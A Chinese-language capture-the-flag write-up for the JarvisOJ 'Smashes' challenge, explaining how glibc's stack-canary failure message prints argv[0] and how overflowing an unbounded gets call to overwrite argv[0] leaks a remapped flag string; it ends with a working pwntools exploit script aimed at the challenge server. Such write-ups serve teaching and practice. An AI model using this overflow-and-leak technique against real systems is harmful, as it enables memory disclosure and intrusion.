---
title: jarvis_Smashes
date: 2020-02-12 21:54:39
tags:
- pwn
- jarvisOJ
---

# JarvisOJ Smashes

### 0x0 前置补偿

[关于CANARY的几种绕过方法]([https://veritas501.space/2017/04/28/%E8%AE%BAcanary%E7%9A%84%E5%87%A0%E7%A7%8D%E7%8E%A9%E6%B3%95/](https://veritas501.space/2017/04/28/论canary的几种玩法/))

CANARY 相关函数：

`__stack_chk_fail` :

```C
void 
__attribute__ ((noreturn)) 
__stack_chk_fail (void) {   
	__fortify_fail ("stack smashing detected"); 
}
```

`fortify_fail`:

```c
void 
__attribute__ ((noreturn)) 
__fortify_fail (msg)
   const char *msg; {
      /* The loop is added only to keep gcc happy. */
         while (1)
              __libc_message (2, "*** %s ***: %s terminated\n", msg, __libc_argv[0] ?: "<unknown>") 
} 
libc_hidden_def (__fortify_fail)
```

所以看到这里如果CANARY被破坏，函数会打印`argv[0]`的值。也就是程序的名称。

另外：

ELF重映射：当可执行文件足够小时，在不同的区段可能被多次映射。

### 0x1 分析

看一下安全性：

<img src="https://i.loli.net/2020/02/12/XaVvNxPMLH9mfOJ.png" style="zoom:50%;" />

有CANARY保护

看一下反编译的代码

`main()`:

```c
__int64 __fastcall main(__int64 a1, char **a2, char **a3)
{
  FILE *v3; // rdi

  v3 = stdout;
  setbuf(stdout, 0LL);
  sub_4007E0(v3, 0LL);
  return 0LL;
}
```

没啥东西。接着看`sub_4007E0`函数吧。

`sub_4007E0`:

```c
unsigned __int64 sub_4007E0()
{
  __int64 v0; // rbx
  int v1; // eax
  __int64 v3; // [rsp+0h] [rbp-128h]
  unsigned __int64 v4; // [rsp+108h] [rbp-20h]

  v4 = __readfsqword(0x28u);
  __printf_chk(1LL, "Hello!\nWhat's your name? ");
  if ( !_IO_gets(&v3) )
LABEL_9:
    _exit(1);
  v0 = 0LL;
  __printf_chk(1LL, "Nice to meet you, %s.\nPlease overwrite the flag: ");
  while ( 1 )
  {
    v1 = _IO_getc(stdin);
    if ( v1 == -1 )
      goto LABEL_9;
    if ( v1 == 10 )
      break;
    byte_600D20[v0++] = v1;
    if ( v0 == 32 )
      goto LABEL_8;
  }
  memset((void *)((signed int)v0 + 6294816LL), 0, (unsigned int)(32 - v0));
LABEL_8:
  puts("Thank you, bye!");
  return __readfsqword(0x28u) ^ v4;
}
```

这里发现`_IO_gets(&v3)`这里可以无限制输入，可以栈溢出。但是有CANARY保护。还要另想办法。

后面还有个输入`_IO_getc(stdin);`但是只能最多输入$32$个字符。

`memset((void *)((signed int)v0 + 6294816LL), 0, (unsigned int)(32 - v0));`

接着这个位置之后的地方就被清空了。

但是看`byte_600D20`这个地方的时候，我们发现了暗示：

![](https://i.loli.net/2020/02/12/WtrJzOQlTioAS5Y.png)

我们发现这个地方的下一个字节是一段字符串，也许泄漏这个地方就能得到`flag`，但是很遗憾这个地方被覆盖了。还是因为这句代码：

`memset((void *)((signed int)v0 + 6294816LL), 0, (unsigned int)(32 - v0));`

但是由于ELF重映射，我们发现：

<img src="https://i.loli.net/2020/02/12/WbdFxAlNcHCrhMI.png" style="zoom:150%;" />

`flag`字符串一定有备份在`0x400000`后面。

Got it!

![](https://i.loli.net/2020/02/12/WU923aRrkJ6dNHn.png)

接下来就是泄漏这个位置。

我们利用CANARY被破坏后输出`argv[0]`的机制。我们通过`IO_gets`覆盖`argv[0]`。达到泄漏的目的。

所以我们需要找到我们输入的地方与`argv[0]`的距离。

![](https://i.loli.net/2020/02/12/lwXcsbTgdBHAjnQ.png)

我们找最远的那个位置。

另外我们输入的时候`esp`的位置：

![](https://i.loli.net/2020/02/12/eLYHfpCRWcbxUmO.png)

所以距离为：`0x7fffffffefd7 - 0x7fffffffe3d0`

所以可以设置`payload`为`(0x7fffffffefd7 - 0x7fffffffe3d0)/8 * p64(0x400d21)`

完事儿。

### 0x2 EXP

```python
#! /usr/bin/python
#coding:utf-8

from pwn import *

flag_addr = 0x400d21 
payload = (0x7fffffffefd7 - 0x7fffffffe3d0)/8 * p64(flag_addr)

p = remote("pwn.jarvisoj.com", 9877)
p.sendlineafter("What's your name?", payload)
p.sendline("1")
p.interactive()
```

